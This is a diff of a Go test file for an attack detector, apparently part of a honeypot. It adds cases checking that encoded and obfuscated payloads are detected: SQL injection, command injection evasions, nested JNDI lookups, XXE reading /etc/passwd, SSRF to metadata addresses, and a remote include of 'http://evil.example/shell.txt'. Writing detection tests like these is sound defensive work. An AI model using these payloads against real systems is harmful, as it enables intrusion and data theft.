@@ -6,6 +6,7 @@ import (
 	"context"
 	"crypto/sha256"
 	"encoding/base64"
+	"encoding/binary"
 	"encoding/json"
 	"errors"
 	"io"
@@ -75,8 +76,8 @@ func TestDetectionConfidenceCoversNewFamilies(t *testing.T) {
 	}
 }
 
-// Cover the reviewed evasions without relying on detail wording
-func TestDetectionCoversReviewedEvasions(t *testing.T) {
+// Cover known evasions without relying on detail wording
+func TestDetectionCoversKnownEvasions(t *testing.T) {
 	tests := []struct {
 		name       string
 		input      detectionInput
@@ -155,6 +156,135 @@ func TestDetectionCoversReviewedEvasions(t *testing.T) {
 				return
 			}
 			t.Fatalf("missing %q detection", test.attackType)
+		})
+	}
+}
+
+// Keep distinct encoding and syntax evasions covered by focused inputs
+func TestDetectionCoversEncodedAndStructuredEvasions(t *testing.T) {
+	tests := []struct {
+		name       string
+		input      detectionInput
+		attackType string
+	}{
+		{name: "six-pass traversal", input: detectionInput{Path: "/", RawQuery: "p=%25252525252e%25252525252e%25252525252fetc%25252525252fpasswd"}, attackType: "Path Traversal"},
+		{name: "NUL traversal", input: detectionInput{Path: "/", RawQuery: "p=..%00/..%00/etc/passwd"}, attackType: "Path Traversal"},
+		{name: "Unicode traversal", input: detectionInput{Path: "/", RawQuery: "p=%E2%80%A4%E2%80%A4%E2%81%84etc/passwd"}, attackType: "Path Traversal"},
+		{name: "NUL SQL", input: detectionInput{Path: "/", RawQuery: "id=1%00OR%001=1"}, attackType: "SQL Injection"},
+		{name: "fullwidth SSRF address", input: detectionInput{Path: "/", RawQuery: "url=http://%EF%BC%91%EF%BC%92%EF%BC%97.0.0.1/"}, attackType: "SSRF"},
+		{name: "parameterized IFS", input: detectionInput{Path: "/", RawQuery: `x=;whoami${IFS%??}`}, attackType: "Command Injection"},
+		{name: "globbed command path", input: detectionInput{Path: "/", RawQuery: `x=;/???/whoami`}, attackType: "Command Injection"},
+		{name: "globbed command name", input: detectionInput{Path: "/", RawQuery: `x=;c?t /etc/passwd`}, attackType: "Command Injection"},
+		{name: "PATH-derived separator", input: detectionInput{Path: "/", RawQuery: `x=;${PATH:0:1}whoami`}, attackType: "Command Injection"},
+		{name: "generic command substitution", input: detectionInput{Path: "/", RawQuery: `x=;$(printf whoami)`}, attackType: "Command Injection"},
+		{name: "environment-prefixed command", input: detectionInput{Path: "/", RawQuery: `x=;FOO=bar whoami`}, attackType: "Command Injection"},
+		{name: "escaped command name", input: detectionInput{Path: "/", RawQuery: `x=;wh\oami`}, attackType: "Command Injection"},
+		{name: "comment after command", input: detectionInput{Path: "/", RawQuery: `x=;whoami#`}, attackType: "Command Injection"},
+		{name: "single-quoted command", input: detectionInput{Path: "/", RawQuery: `x=;'whoami'`}, attackType: "Command Injection"},
+		{name: "double-quoted command", input: detectionInput{Path: "/", RawQuery: `x=;"whoami"`}, attackType: "Command Injection"},
+		{name: "variable suffix after command", input: detectionInput{Path: "/", RawQuery: `x=;whoami$`}, attackType: "Command Injection"},
+		{name: "subshell command", input: detectionInput{Path: "/", RawQuery: `x=;(whoami)`}, attackType: "Command Injection"},
+		{name: "grouped command", input: detectionInput{Path: "/", RawQuery: `x=;{whoami;}`}, attackType: "Command Injection"},
+		{name: "conditional command", input: detectionInput{Path: "/", RawQuery: `x=;if true;then whoami;fi`}, attackType: "Command Injection"},
+		{name: "looped command", input: detectionInput{Path: "/", RawQuery: `x=;while true;do whoami;done`}, attackType: "Command Injection"},
+		{name: "evaluated command", input: detectionInput{Path: "/", RawQuery: `x=;eval whoami`}, attackType: "Command Injection"},
+		{name: "JSON command substitution", input: detectionInput{Path: "/", Body: `{"value":"$(printf whoami)"}`, Header: http.Header{"Content-Type": []string{"application/json"}}}, attackType: "Command Injection"},
+		{name: "compact quoted SQL OR", input: detectionInput{Path: "/", RawQuery: `u='or(1)=1`}, attackType: "SQL Injection"},
+		{name: "parenthesized quoted SQL", input: detectionInput{Path: "/", RawQuery: `u='or('1')='1`}, attackType: "SQL Injection"},
+		{name: "compact numeric SQL OR", input: detectionInput{Path: "/", RawQuery: `u=1or(1)=1`}, attackType: "SQL Injection"},
+		{name: "compact SQL AND", input: detectionInput{Path: "/", RawQuery: `u='and(1)=(1)`}, attackType: "SQL Injection"},
+		{name: "negated SQL operand", input: detectionInput{Path: "/", RawQuery: `u='or not(1)=2`}, attackType: "SQL Injection"},
+		{name: "hexadecimal SQL operand", input: detectionInput{Path: "/", RawQuery: `u=1 or 'a'=0x61`}, attackType: "SQL Injection"},
+		{name: "function SQL operands", input: detectionInput{Path: "/", RawQuery: `u=1 or char(49)=char(49)`}, attackType: "SQL Injection"},
+		{name: "compact SQL CASE", input: detectionInput{Path: "/", RawQuery: `u=1 and case when 1=1 then 1 else 0 end`}, attackType: "SQL Injection"},
+		{name: "compact SQL IF", input: detectionInput{Path: "/", RawQuery: `u=1 and if(1=1,1,0)`}, attackType: "SQL Injection"},
+		{name: "compact SQL HAVING", input: detectionInput{Path: "/", RawQuery: `u=1 having 1=1`}, attackType: "SQL Injection"},
+		{name: "compact SQL XOR", input: detectionInput{Path: "/", RawQuery: `u=1 xor(1)=1`}, attackType: "SQL Injection"},
+		{name: "quoted SQL true", input: detectionInput{Path: "/", RawQuery: `u=' OR true--`}, attackType: "SQL Injection"},
+		{name: "numeric SQL true", input: detectionInput{Path: "/", RawQuery: `u=1 OR true`}, attackType: "SQL Injection"},
+		{name: "JSON numeric SQL OR", input: detectionInput{Path: "/", Body: `{"id":"1 or 1=1"}`, Header: http.Header{"Content-Type": []string{"application/json"}}}, attackType: "SQL Injection"},
+		{name: "JSON numeric SQL AND", input: detectionInput{Path: "/", Body: `{"id":"1 and 1=1"}`, Header: http.Header{"Content-Type": []string{"application/json"}}}, attackType: "SQL Injection"},
+		{name: "JSON parenthesized SQL", input: detectionInput{Path: "/", Body: `{"id":"1 or (1)=1"}`, Header: http.Header{"Content-Type": []string{"application/json"}}}, attackType: "SQL Injection"},
+		{name: "nested environment JNDI", input: detectionInput{Path: "/", RawQuery: `q=${${env:X:-${lower:j}}}ndi:ldap://example.com/a}`}, attackType: "JNDI Injection"},
+		{name: "nested system JNDI", input: detectionInput{Path: "/", RawQuery: `q=${${sys:j}ndi:ldap://example.com/a}`}, attackType: "JNDI Injection"},
+		{name: "nested date JNDI", input: detectionInput{Path: "/", RawQuery: `q=${${date:j}ndi:ldap://example.com/a}`}, attackType: "JNDI Injection"},
+		{name: "nested main JNDI", input: detectionInput{Path: "/", RawQuery: `q=${${main:j}ndi:ldap://example.com/a}`}, attackType: "JNDI Injection"},
+		{name: "nested context JNDI", input: detectionInput{Path: "/", RawQuery: `q=${${ctx:j}ndi:ldap://example.com/a}`}, attackType: "JNDI Injection"},
+		{name: "JSON XML entity", input: detectionInput{Path: "/", Body: `{"xml":"<!ENTITY x SYSTEM \"file:///etc/passwd\">"}`, Header: http.Header{"Content-Type": []string{"application/json"}}}, attackType: "XML Entity"},
+		{name: "Bearer JNDI", input: detectionInput{Path: "/", Header: http.Header{"Authorization": []string{"Bearer ${jndi:ldap://example.com/a}"}}}, attackType: "JNDI Injection"},
+		{name: "Bearer SQL", input: detectionInput{Path: "/", Header: http.Header{"Authorization": []string{"Bearer 1 OR 1=1"}}}, attackType: "SQL Injection"},
+		{name: "XML content type", input: detectionInput{Path: "/", Header: http.Header{"Content-Type": []string{`<!ENTITY x SYSTEM "file:///etc/passwd">`}}}, attackType: "XML Entity"},
+		{name: "JSON Schema operator", input: detectionInput{Path: "/", RawQuery: `user[$jsonSchema]=x`}, attackType: "NoSQL Injection"},
+		{name: "link SSRF sink", input: detectionInput{Path: "/", RawQuery: "link=http://169.254.169.254/"}, attackType: "SSRF"},
+		{name: "image URL SSRF sink", input: detectionInput{Path: "/", RawQuery: "imageurl=http://127.0.0.1/"}, attackType: "SSRF"},
+		{name: "benchmark SSRF range", input: detectionInput{Path: "/", RawQuery: "url=http://198.18.0.1/"}, attackType: "SSRF"},
+		{name: "JAR SSRF scheme", input: detectionInput{Path: "/", RawQuery: "url=jar:http://127.0.0.1/a.jar!/x"}, attackType: "SSRF"},
+	}
+
+	for _, test := range tests {
+		t.Run(test.name, func(t *testing.T) {
+			if detections := detectAttacks(test.input); !hasDetectionType(detections, test.attackType) {
+				t.Fatalf("missing %q detection in %+v", test.attackType, detections)
+			}
+		})
+	}
+}
+
+// Encode an ASCII fixture as UTF-16 for request inspection
+func encodeUTF16Fixture(value string, order binary.ByteOrder, withBOM bool) []byte {
+	offset := 0
+	if withBOM {
+		offset = 2
+	}
+	encoded := make([]byte, offset+len(value)*2)
+	if withBOM && order == binary.LittleEndian {
+		encoded[0], encoded[1] = 0xff, 0xfe
+	} else if withBOM {
+		encoded[0], encoded[1] = 0xfe, 0xff
+	}
+	for index, current := range []byte(value) {
+		order.PutUint16(encoded[offset+index*2:], uint16(current))
+	}
+	return encoded
+}
+
+// Encode an ASCII fixture as UTF-32 for request inspection
+func encodeUTF32Fixture(value string, order binary.ByteOrder, withBOM bool) []byte {
+	offset := 0
+	if withBOM {
+		offset = 4
+	}
+	encoded := make([]byte, offset+len(value)*4)
+	if withBOM && order == binary.LittleEndian {
+		copy(encoded, []byte{0xff, 0xfe, 0x00, 0x00})
+	} else if withBOM {
+		copy(encoded, []byte{0x00, 0x00, 0xfe, 0xff})
+	}
+	for index, current := range []byte(value) {
+		order.PutUint32(encoded[offset+index*4:], uint32(current))
+	}
+	return encoded
+}
+
+// Inspect UTF-16 and UTF-32 XML with BOM and heuristic byte order detection
+func TestXMLDetectionHandlesUnicodeBodies(t *testing.T) {
+	xmlEntity := `<!ENTITY x SYSTEM "file:///etc/passwd">`
+	tests := []struct {
+		name string
+		body []byte
+	}{
+		{name: "UTF-16 little endian with BOM", body: encodeUTF16Fixture(xmlEntity, binary.LittleEndian, true)},
+		{name: "UTF-16 big endian without BOM", body: encodeUTF16Fixture(xmlEntity, binary.BigEndian, false)},
+		{name: "UTF-32 little endian with BOM", body: encodeUTF32Fixture(xmlEntity, binary.LittleEndian, true)},
+		{name: "UTF-32 big endian with BOM", body: encodeUTF32Fixture(xmlEntity, binary.BigEndian, true)},
+	}
+
+	for _, test := range tests {
+		t.Run(test.name, func(t *testing.T) {
+			input := detectionInput{Path: "/", Body: string(test.body), Header: http.Header{"Content-Type": []string{"application/xml"}}}
+			if detections := detectAttacks(input); !hasDetectionType(detections, "XML Entity") {
+				t.Fatalf("missing XML detection in %+v", detections)
+			}
 		})
 	}
 }
@@ -280,6 +410,7 @@ func TestSSRFDetectionRejectsSafeTargets(t *testing.T) {
 	queries := []string{
 		"next=/home",
 		"fetch=https://example.com/release",
+		"url=https://example.com/release",
 		"host=http://8.8.8.8/status",
 		"src=https://cdn.example.com/image.svg",
 		"image=data:image/png;base64,AAAA",
@@ -291,12 +422,16 @@ func TestSSRFDetectionRejectsSafeTargets(t *testing.T) {
 	}
 }
 
-// Decode structured Base64 values once while preserving their field names
+// Decode bounded structured Base64 values while preserving their field names
 func TestDetectionDecodesStructuredBase64Values(t *testing.T) {
 	standardXSS := base64.StdEncoding.EncodeToString([]byte(`<script>alert(1)</script>`))
 	formCommand := base64.StdEncoding.EncodeToString([]byte("whoami"))
 	jsonSSRF := base64.StdEncoding.EncodeToString([]byte("http://169.254.169.254/latest"))
 	urlJNDI := base64.RawURLEncoding.EncodeToString([]byte(`🍯${jndi:ldap://example.com/a}`))
+	recursiveCommand := "whoami"
+	for range 3 {
+		recursiveCommand = base64.StdEncoding.EncodeToString([]byte(recursiveCommand))
+	}
 	if !strings.ContainsAny(urlJNDI, "-_") {
 		t.Fatal("URL safe fixture does not exercise its distinct alphabet")
 	}
@@ -309,6 +444,7 @@ func TestDetectionDecodesStructuredBase64Values(t *testing.T) {
 		{name: "form command value", input: detectionInput{Path: "/", Body: "cmd=" + url.QueryEscape(formCommand), Header: http.Header{"Content-Type": []string{"application/x-www-form-urlencoded"}}}, attackType: "Command Injection"},
 		{name: "JSON URL value", input: detectionInput{Path: "/", Body: `{"url":"` + jsonSSRF + `"}`, Header: http.Header{"Content-Type": []string{"application/json"}}}, attackType: "SSRF"},
 		{name: "raw URL safe value", input: detectionInput{Path: "/", RawQuery: "q=" + urlJNDI}, attackType: "JNDI Injection"},
+		{name: "recursive command value", input: detectionInput{Path: "/", RawQuery: "cmd=" + recursiveCommand}, attackType: "Command Injection"},
 	}
 
 	for _, test := range tests {
@@ -386,6 +522,10 @@ func TestDetectionScansMultipartText(t *testing.T) {
 	}{
 		{name: "raw XSS", field: "q", value: `<script>alert(1)</script>`, attackType: "XSS"},
 		{name: "Base64 SQL", field: "p", value: `dT0nIE9SIDE9MSAtLQ==`, attackType: "SQL Injection"},
+		{name: "SSRF field", field: "url", value: "http://169.254.169.254/", attackType: "SSRF"},
+		{name: "command field", field: "cmd", value: "whoami", attackType: "Command Injection"},
+		{name: "NoSQL field", field: "user[$ne]", value: "guest", attackType: "NoSQL Injection"},
+		{name: "remote include field", field: "file", value: "http://evil.example/shell.txt", attackType: "LFI/RFI"},
 	}
 	for _, test := range tests {
 		t.Run(test.name, func(t *testing.T) {
@@ -452,8 +592,10 @@ func TestRequestInspectionHandlesGzipBodies(t *testing.T) {
 // Inspect nested gzip payloads and preserve the original body
 func TestRequestInspectionHandlesNestedGzipBodies(t *testing.T) {
 	resetRecentLogs(t)
-	innerBody := gzipTestBody(t, `u=' OR 1=1 --`)
-	rawBody := gzipTestBody(t, string(innerBody))
+	rawBody := []byte(`u=' OR 1=1 --`)
+	for range 6 {
+		rawBody = gzipTestBody(t, string(rawBody))
+	}
 	request := httptest.NewRequest(http.MethodPost, "http://example.test/", bytes.NewReader(rawBody))
 	request.Header.Set("Content-Encoding", "gzip")
 	request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
@@ -744,6 +886,9 @@ func TestBenignDetectionCorpus(t *testing.T) {
 		{Path: "/", Header: http.Header{"Authorization": []string{"Basic dXNlcjpvcmRpbmFyeQ=="}}},
 		{Path: "/api", Body: `{"description":"$or is documented here"}`},
 		{Path: "/guide", Body: "Store settings in the .env file."},
+		{Path: "/guide", Body: "Use $(name) as a placeholder in this document."},
+		{Path: "/guide", Body: "The team is true while the release is stable."},
+		{Path: "/", RawQuery: "id=version1or2"},
 		{Path: "/", Body: `<body>hello world</body>`},
 	}
 
@@ -779,34 +924,33 @@ func TestPartitionedEvictionAdmitsWeakSignals(t *testing.T) {
 	}
 }
 
-// Evict an overrepresented confidence class before a reserved signal
+// Preserve existing confidence classes during a high-volume alert flood
 func TestPartitionedEvictionPreservesExistingClasses(t *testing.T) {
 	resetRecentLogs(t)
-	for index := 0; index < logBufferSize; index++ {
-		value := confidenceMedium
-		attackType := "SQL Injection"
-		if index == 0 {
-			value = ""
-			attackType = "HoneypotAccess"
-		}
-		logEvent("info", "192.0.2.1", "test", "/", attackType, "test", "", "", value)
+	logEvent("info", "192.0.2.1", "test", "/", "HoneypotAccess", "test", "", "", "")
+	logEvent("info", "192.0.2.2", "test", "/", "SSRF", "test", "", "", confidenceMedium)
+	for range logBufferSize + 20 {
+		logEvent("warn", "192.0.2.3", "test", "/", "XSS", "test", "", "", confidenceHigh)
 	}
-	logEvent("warn", "192.0.2.2", "test", "/", "XSS", "test", "", "", confidenceHigh)
 
 	logMutex.Lock()
 	defer logMutex.Unlock()
 	weakFound := false
+	mediumFound := false
 	highFound := false
 	for _, entry := range recentLogs {
 		if entry.Confidence == "" {
 			weakFound = true
 		}
+		if entry.Confidence == confidenceMedium {
+			mediumFound = true
+		}
 		if entry.Confidence == confidenceHigh {
 			highFound = true
 		}
 	}
-	if !weakFound || !highFound {
-		t.Fatalf("reserved confidence classes missing: weak=%t high=%t", weakFound, highFound)
+	if !weakFound || !mediumFound || !highFound {
+		t.Fatalf("reserved confidence classes missing: weak=%t medium=%t high=%t", weakFound, mediumFound, highFound)
 	}
 }
 
